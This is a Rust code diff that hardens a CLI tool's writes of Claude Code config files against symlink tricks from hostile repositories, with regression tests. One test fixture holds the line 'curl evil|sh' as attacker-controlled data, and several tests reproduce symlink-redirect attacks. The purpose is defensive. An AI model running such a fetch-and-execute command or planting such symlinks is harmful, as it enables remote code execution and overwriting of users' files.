@@ -20,6 +20,132 @@ fn print_header(msg: &str) {
     eprintln!("\n{}", style(msg).cyan().bold());
 }
 
+/// Mode to (re)write `path` with: its current mode if it exists, otherwise
+/// `default_new_mode`.
+#[cfg(unix)]
+fn target_mode(path: &Path, default_new_mode: u32) -> u32 {
+    use std::os::unix::fs::PermissionsExt;
+    fs::metadata(path)
+        .map(|m| m.permissions().mode() & 0o777)
+        .unwrap_or(default_new_mode)
+}
+
+#[cfg(not(unix))]
+fn target_mode(_path: &Path, default_new_mode: u32) -> u32 {
+    default_new_mode
+}
+
+/// Write `content` to `path`, creating it fresh with `mode` applied at creation time.
+///
+/// Never follows a symlink at `path` and never writes through whatever's already
+/// there. `path` is often a predictable name (a `.tmp` sibling of a config file, or a
+/// plain project file like shire.toml) that a hostile repo can commit ahead of time as
+/// a symlink pointing outside the repo — or as a dangling symlink — and have this
+/// function write through it (attacker-controlled content, in the .gitignore case) to
+/// an arbitrary user-writable location. Any pre-existing entry at `path` (always
+/// something *we* own — a stale temp file, or the file we're about to (re)create) is
+/// removed first; `remove_file` never follows a symlink for removal, so this can't be
+/// redirected into deleting something else. The file is then created with
+/// `O_CREAT|O_EXCL` (`create_new`) plus `O_NOFOLLOW`: if something reappears at `path`
+/// between the remove and the create — a symlink replanted in that narrow window, or a
+/// concurrent process — the create fails with `AlreadyExists`/`ELOOP` rather than
+/// following it or overwriting it, and that is a hard error here, not a silent retry.
+#[cfg(unix)]
+fn write_with_mode(path: &Path, content: &str, mode: u32) -> Result<()> {
+    use std::io::Write;
+    use std::os::unix::fs::OpenOptionsExt;
+
+    // Best-effort: clear whatever's there so create_new below starts from a clean
+    // slate. Not fatal by itself (e.g. permission denied) — a real problem surfaces as
+    // create_new failing next.
+    let _ = fs::remove_file(path);
+
+    let open_result = fs::OpenOptions::new()
+        .write(true)
+        .create_new(true)
+        .custom_flags(libc::O_NOFOLLOW)
+        .mode(mode)
+        .open(path);
+    let mut f = match open_result {
+        Ok(f) => f,
+        // remove_file() above can't remove a directory, so AlreadyExists here most
+        // often means one is sitting at `path` — give a specific, actionable message
+        // instead of a raw io::Error and a backtrace.
+        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
+            if std::fs::symlink_metadata(path).is_ok_and(|m| m.is_dir()) {
+                anyhow::bail!(
+                    "Refusing to write {}: a directory exists at that path. Remove it \
+                     manually and re-run.",
+                    path.display()
+                );
+            }
+            anyhow::bail!(
+                "Failed to create {}: a file or symlink reappeared there, or a \
+                 concurrent process is racing this write.",
+                path.display()
+            );
+        }
+        Err(e) => return Err(e).with_context(|| format!("Failed to write {}", path.display())),
+    };
+    f.write_all(content.as_bytes())
+        .with_context(|| format!("Failed to write {}", path.display()))?;
+    Ok(())
+}
+
+#[cfg(not(unix))]
+fn write_with_mode(path: &Path, content: &str, _mode: u32) -> Result<()> {
+    let _ = fs::remove_file(path);
+    fs::write(path, content).with_context(|| format!("Failed to write {}", path.display()))
+}
+
+/// Ensure `dir` (a path under `root`, e.g. `<root>/.claude` or `<root>/.claude/rules`)
+/// exists as a real directory, confined to `root`: every path component from `root`
+/// down is lstat'd (not stat'd) and required to be either absent — in which case it's
+/// created fresh with `create_dir`, one level at a time — or already a plain
+/// directory. Refuses with a clear error if any component is a symlink or exists as
+/// something else (a file, say).
+///
+/// `write_with_mode`'s O_NOFOLLOW only guards the *final* component of a write path; a
+/// hostile repo committing `.claude` itself (or `.claude/rules`) as a symlink to a
+/// directory outside the repo would otherwise have the settings.json / rules/shire.md
+/// write silently follow it there, since a plain `create_dir_all` happily walks
+/// through an existing symlink to reach (and create files under) wherever it points.
+fn create_dir_confined(root: &Path, dir: &Path) -> Result<()> {
+    let rel = dir
+        .strip_prefix(root)
+        .with_context(|| format!("{} is not under {}", dir.display(), root.display()))?;
+
+    let mut current = root.to_path_buf();
+    for component in rel.components() {
+        current.push(component);
+        match fs::symlink_metadata(&current) {
+            Ok(meta) if meta.file_type().is_symlink() => {
+                anyhow::bail!(
+                    "Refusing to write into {}: it is a symlink, not a plain directory. \
+                     Remove it (or point it at a real directory yourself) and re-run.",
+                    current.display()
+                );
+            }
+            Ok(meta) if !meta.is_dir() => {
+                anyhow::bail!(
+                    "Refusing to write into {}: it exists but is not a directory.",
+                    current.display()
+                );
+            }
+            Ok(_) => {} // already a real directory
+            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
+                fs::create_dir(&current)
+                    .with_context(|| format!("Failed to create directory {}", current.display()))?;
+            }
+            Err(e) => {
+                return Err(e).with_context(|| format!("Failed to stat {}", current.display()));
+            }
+        }
+    }
+
+    Ok(())
+}
+
 const CLAUDE_MD_LINE: &str = "When searching code, use Shire MCP tools (search_symbols, search_files, explore) instead of Grep/Glob.";
 
 const RULES_CONTENT: &str = r#"# Shire — codebase search index
@@ -309,8 +435,7 @@ pub fn run_init(root: &Path, no_hook: bool, yes: bool) -> Result<()> {
     };
     if should_write {
         let content = generate_config_toml(&opts, false);
-        fs::write(&config_path, content)
-            .with_context(|| format!("Failed to write {}", config_path.display()))?;
+        write_with_mode(&config_path, &content, target_mode(&config_path, 0o600))?;
         print_created(&format!(
             "{} {}",
             if config_exists { "Updated" } else { "Created" },
@@ -329,8 +454,7 @@ pub fn run_init(root: &Path, no_hook: bool, yes: bool) -> Result<()> {
     // 3. Write hooks to .claude/settings.json (only in hook mode)
     if opts.use_hook {
         let claude_dir = root.join(".claude");
-        fs::create_dir_all(&claude_dir)
-            .with_context(|| format!("Failed to create directory {}", claude_dir.display()))?;
+        create_dir_confined(root, &claude_dir)?;
         let settings_path = claude_dir.join("settings.json");
         patch_claude_hooks(&settings_path, ".claude/settings.json", "shire init")?;
     }
@@ -338,6 +462,7 @@ pub fn run_init(root: &Path, no_hook: bool, yes: bool) -> Result<()> {
     // 4. Write .claude/rules/shire.md
     if opts.generate_rules {
         let rules_dir = root.join(".claude/rules");
+        create_dir_confined(root, &rules_dir)?;
         write_rules_file(&rules_dir, ".claude/rules/shire.md", opts.refs_enabled)?;
     }
 
@@ -410,8 +535,7 @@ fn run_init_global_in(claude_dir: &Path, opts: &InitOptions) -> Result<()> {
     };
     if should_write {
         let content = generate_config_toml(opts, true);
-        fs::write(&config_path, content)
-            .with_context(|| format!("Failed to write {}", config_path.display()))?;
+        write_with_mode(&config_path, &content, target_mode(&config_path, 0o600))?;
         print_created(&format!(
             "{} ~/.claude/shire.toml",
             if config_exists { "Updated" } else { "Created" }
@@ -501,8 +625,11 @@ fn write_mcp_json(root: &Path, serve_args: Value, reinit_cmd: &str) -> Result<()
     let output = serde_json::to_string_pretty(&Value::Object(mcp))
         .context("Failed to serialize .mcp.json")?;
     let tmp_path = mcp_path.with_extension("json.tmp");
-    fs::write(&tmp_path, format!("{output}\n"))
-        .with_context(|| format!("Failed to write {}", tmp_path.display()))?;
+    write_with_mode(
+        &tmp_path,
+        &format!("{output}\n"),
+        target_mode(&mcp_path, 0o600),
+    )?;
     if let Err(e) = fs::rename(&tmp_path, &mcp_path) {
         let _ = fs::remove_file(&tmp_path);
         return Err(e).with_context(|| {
@@ -518,6 +645,11 @@ fn write_mcp_json(root: &Path, serve_args: Value, reinit_cmd: &str) -> Result<()
 }
 
 /// Patch a Claude Code settings JSON file to add hooks.PostToolUse only.
+///
+/// A brand-new file (project-local `.claude/settings.json` or global
+/// `~/.claude/settings.json` — the latter can carry hook commands with embedded
+/// secrets) is created at 0600 (`write_with_mode`/`target_mode`); rewriting an existing
+/// file preserves whatever mode it already had.
 fn patch_claude_hooks(settings_path: &Path, display_path: &str, reinit_cmd: &str) -> Result<()> {
     let mut settings: Map<String, Value> = if settings_path.exists() {
         let content = fs::read_to_string(settings_path)
@@ -580,8 +712,11 @@ fn patch_claude_hooks(settings_path: &Path, display_path: &str, reinit_cmd: &str
     let output = serde_json::to_string_pretty(&Value::Object(settings))
         .context("Failed to serialize settings to JSON")?;
     let tmp_path = settings_path.with_extension("json.tmp");
-    fs::write(&tmp_path, format!("{output}\n"))
-        .with_context(|| format!("Failed to write {}", tmp_path.display()))?;
+    write_with_mode(
+        &tmp_path,
+        &format!("{output}\n"),
+        target_mode(settings_path, 0o600),
+    )?;
     if let Err(e) = fs::rename(&tmp_path, settings_path) {
         let _ = fs::remove_file(&tmp_path);
         return Err(e).with_context(|| {
@@ -630,8 +765,10 @@ fn patch_claude_json(path: &Path, serve_args: Value, reinit_cmd: &str) -> Result
     let output = serde_json::to_string_pretty(&Value::Object(config))
         .context("Failed to serialize ~/.claude.json")?;
     let tmp_path = path.with_extension("json.tmp");
-    fs::write(&tmp_path, format!("{output}\n"))
-        .with_context(|| format!("Failed to write {}", tmp_path.display()))?;
+    // ~/.claude.json routinely carries oauth/account metadata and mcpServers env
+    // blocks; a file we're creating starts at 0600 (matching Claude Code's own
+    // default), applied at creation time rather than a later chmod.
+    write_with_mode(&tmp_path, &format!("{output}\n"), target_mode(path, 0o600))?;
     if let Err(e) = fs::rename(&tmp_path, path) {
         let _ = fs::remove_file(&tmp_path);
         return Err(e).with_context(|| {
@@ -649,8 +786,7 @@ fn patch_claude_json(path: &Path, serve_args: Value, reinit_cmd: &str) -> Result
 /// Write content to a file atomically via a temp file + rename.
 fn atomic_write(path: &Path, content: &str) -> Result<()> {
     let tmp_path = path.with_extension("tmp");
-    fs::write(&tmp_path, content)
-        .with_context(|| format!("Failed to write {}", tmp_path.display()))?;
+    write_with_mode(&tmp_path, content, target_mode(path, 0o600))?;
     if let Err(e) = fs::rename(&tmp_path, path) {
         let _ = fs::remove_file(&tmp_path);
         return Err(e).with_context(|| {
@@ -1413,5 +1549,289 @@ mod tests {
         let content = fs::read_to_string(claude_dir.join("CLAUDE.md")).unwrap();
         assert!(content.contains("# No newline\n\n"));
         assert!(content.contains(CLAUDE_MD_LINE));
+    }
+
+    // --- CLI-1: rewriting ~/.claude.json / ~/.claude/settings.json must not drop an
+    // existing permission mode, and a freshly created one should start at 0600 ---
+
+    #[test]
+    #[cfg(unix)]
+    fn patch_claude_json_preserves_existing_mode() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::TempDir::new().unwrap();
+        let path = dir.path().join(".claude.json");
+        fs::write(&path, "{}").unwrap();
+        fs::set_permissions(&path, fs::Permissions::from_mode(0o600)).unwrap();
+
+        patch_claude_json(&path, json!(["serve"]), "shire init --global").unwrap();
+
+        let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o600);
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn patch_claude_json_sets_0600_on_a_new_file() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::TempDir::new().unwrap();
+        let path = dir.path().join(".claude.json");
+
+        patch_claude_json(&path, json!(["serve"]), "shire init --global").unwrap();
+
+        let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o600);
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn patch_claude_hooks_sets_0600_on_a_new_global_file() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::TempDir::new().unwrap();
+        let path = dir.path().join("settings.json");
+
+        patch_claude_hooks(&path, "~/.claude/settings.json", "shire init --global").unwrap();
+
+        let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o600);
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn patch_claude_hooks_sets_0600_on_a_new_project_local_file_too() {
+        // Project-local .claude/settings.json also carries hook commands, so it gets
+        // the same safe default as the global file, not just whatever the process
+        // umask would otherwise leave.
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::TempDir::new().unwrap();
+        let path = dir.path().join("settings.json");
+
+        patch_claude_hooks(&path, ".claude/settings.json", "shire init").unwrap();
+
+        let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o600);
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn patch_claude_hooks_preserves_existing_mode() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::TempDir::new().unwrap();
+        let path = dir.path().join("settings.json");
+        fs::write(&path, "{}").unwrap();
+        fs::set_permissions(&path, fs::Permissions::from_mode(0o640)).unwrap();
+
+        patch_claude_hooks(&path, "~/.claude/settings.json", "shire init --global").unwrap();
+
+        let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o640, "an existing mode must be preserved");
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn atomic_writes_never_leave_a_new_file_more_permissive_than_0600_under_umask_0() {
+        // Regression for the transient-window finding: a plain fs::write()-then-chmod
+        // sequence would expose the temp file (and, if chmod ran after rename, briefly
+        // the final path too) at 0o666 under a permissive umask. Creating the file
+        // with an explicit mode from the start must not be affected by umask for a
+        // request this restrictive.
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::TempDir::new().unwrap();
+        let path = dir.path().join(".claude.json");
+
+        // SAFETY: umask is process-global state; restored immediately, and no other
+        // test in this binary depends on a specific umask value.
+        let old_umask = unsafe { libc::umask(0) };
+        let result = patch_claude_json(&path, json!(["serve"]), "shire init --global");
+        unsafe {
+            libc::umask(old_umask);
+        }
+        result.unwrap();
+
+        let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o600, "must be exactly 0600 even under umask 0");
+    }
+
+    // --- round-2 escalation: a hostile repo committing a symlink at a predictable
+    // .tmp path (or a dangling symlink as shire.toml itself) must not redirect writes
+    // outside the repo ---
+
+    #[test]
+    #[cfg(unix)]
+    fn ensure_gitignore_does_not_follow_a_symlinked_tmp_sibling() {
+        // Reproduces the exact escalation: a repo ships an attacker-controlled
+        // .gitignore *and* a symlinked .gitignore.tmp pointing at a victim file
+        // outside the repo. The old write_with_mode would write the (attacker
+        // controlled, read back from the repo's own .gitignore) content through the
+        // symlink to the victim. It's now removed and replaced with a fresh file, so
+        // the legitimate .gitignore update still succeeds and the victim is untouched.
+        let repo = tempfile::TempDir::new().unwrap();
+        let victim_dir = tempfile::TempDir::new().unwrap();
+        let victim = victim_dir.path().join("victim_bashrc_like");
+        std::fs::write(&victim, "original content\n").unwrap();
+
+        std::fs::write(repo.path().join(".gitignore"), "curl evil|sh\n").unwrap();
+        std::os::unix::fs::symlink(&victim, repo.path().join(".gitignore.tmp")).unwrap();
+
+        ensure_gitignore(repo.path(), ".shire").unwrap();
+
+        assert_eq!(
+            fs::read_to_string(&victim).unwrap(),
+            "original content\n",
+            "the victim file outside the repo must be completely untouched"
+        );
+        let gitignore = fs::read_to_string(repo.path().join(".gitignore")).unwrap();
+        assert!(gitignore.contains("curl evil|sh"));
+        assert!(gitignore.contains("/.shire/"));
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn patch_claude_json_dangling_symlink_does_not_create_the_target() {
+        // A hostile repo could ship a dangling symlink as shire.toml (or, for the
+        // global path, something could pre-plant one at ~/.claude.json); either way,
+        // patch_claude_json (and the same-shaped shire.toml writers) must not create a
+        // file at wherever a symlink named `path` points — the symlink is removed and
+        // a real file written at `path` itself instead.
+        let dir = tempfile::TempDir::new().unwrap();
+        let outside = dir.path().join("outside");
+        std::fs::create_dir_all(&outside).unwrap();
+        let dangling_target = outside.join(".claude.json");
+        let link = dir.path().join(".claude.json");
+        std::os::unix::fs::symlink(&dangling_target, &link).unwrap();
+
+        patch_claude_json(&link, json!(["serve"]), "shire init --global").unwrap();
+
+        assert!(
+            !dangling_target.exists(),
+            "must not create the file at the symlink's target"
+        );
+        assert!(
+            !std::fs::symlink_metadata(&link)
+                .unwrap()
+                .file_type()
+                .is_symlink(),
+            "the symlink must have been replaced by a real file"
+        );
+    }
+
+    // --- round-3 findings: symlinked .claude confinement, and a clear error when a
+    // directory sits at a write's target path ---
+
+    #[test]
+    #[cfg(unix)]
+    fn run_init_refuses_a_symlinked_claude_directory() {
+        // A hostile repo commits `.claude` itself as a symlink to a directory outside
+        // the repo; O_NOFOLLOW on the final write component alone doesn't stop this,
+        // since create_dir_all (or a plain write) happily walks through an existing
+        // symlink to reach wherever it points.
+        let repo = tempfile::TempDir::new().unwrap();
+        let outside = tempfile::TempDir::new().unwrap();
+        std::os::unix::fs::symlink(outside.path(), repo.path().join(".claude")).unwrap();
+
+        let result = run_init(repo.path(), false, true);
+
+        assert!(
+            result.is_err(),
+            "init must refuse rather than write through the symlinked .claude"
+        );
+        assert!(
+            !outside.path().join("settings.json").exists(),
+            "settings.json must not be created outside the repo via the symlink"
+        );
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn run_init_refuses_a_symlinked_claude_rules_directory() {
+        // .claude itself is a real directory, but .claude/rules is a symlink outside
+        // the repo — the confinement check walks every component, not just the last.
+        // no_hook=true keeps step 3 (which would otherwise create .claude first) out
+        // of the way, so this specifically exercises step 4's own confinement check.
+        let repo = tempfile::TempDir::new().unwrap();
+        let outside = tempfile::TempDir::new().unwrap();
+        std::fs::create_dir_all(repo.path().join(".claude")).unwrap();
+        std::os::unix::fs::symlink(outside.path(), repo.path().join(".claude/rules")).unwrap();
+
+        let result = run_init(repo.path(), true, true);
+
+        assert!(result.is_err());
+        assert!(!outside.path().join("shire.md").exists());
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn create_dir_confined_creates_missing_directories() {
+        let repo = tempfile::TempDir::new().unwrap();
+        let rules_dir = repo.path().join(".claude/rules");
+
+        create_dir_confined(repo.path(), &rules_dir).unwrap();
+
+        assert!(rules_dir.is_dir());
+        assert!(
+            !std::fs::symlink_metadata(repo.path().join(".claude"))
+                .unwrap()
+                .file_type()
+                .is_symlink()
+        );
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn create_dir_confined_is_idempotent_on_existing_real_directories() {
+        let repo = tempfile::TempDir::new().unwrap();
+        let claude_dir = repo.path().join(".claude");
+        std::fs::create_dir_all(&claude_dir).unwrap();
+
+        create_dir_confined(repo.path(), &claude_dir).unwrap();
+        assert!(claude_dir.is_dir());
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn create_dir_confined_refuses_a_symlinked_component() {
+        let repo = tempfile::TempDir::new().unwrap();
+        let outside = tempfile::TempDir::new().unwrap();
+        std::os::unix::fs::symlink(outside.path(), repo.path().join(".claude")).unwrap();
+
+        let result = create_dir_confined(repo.path(), &repo.path().join(".claude"));
+        assert!(result.is_err());
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn create_dir_confined_refuses_a_non_directory_component() {
+        let repo = tempfile::TempDir::new().unwrap();
+        std::fs::write(repo.path().join(".claude"), "not a directory").unwrap();
+
+        let result = create_dir_confined(repo.path(), &repo.path().join(".claude"));
+        assert!(result.is_err());
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn write_with_mode_reports_a_clear_error_for_a_directory_at_the_target_path() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let target = dir.path().join("mcp.json.tmp");
+        std::fs::create_dir_all(target.join("keepme")).unwrap();
+        std::fs::write(target.join("keepme/data"), "IMPORTANT").unwrap();
+
+        let err = write_with_mode(&target, "content", 0o600).unwrap_err();
+
+        let msg = format!("{err:#}");
+        assert!(
+            msg.contains("directory exists") && msg.contains(&target.display().to_string()),
+            "expected a clear directory-specific message, got: {msg}"
+        );
+        // The directory and its contents must survive untouched.
+        assert_eq!(
+            std::fs::read_to_string(target.join("keepme/data")).unwrap(),
+            "IMPORTANT"
+        );
     }
 }
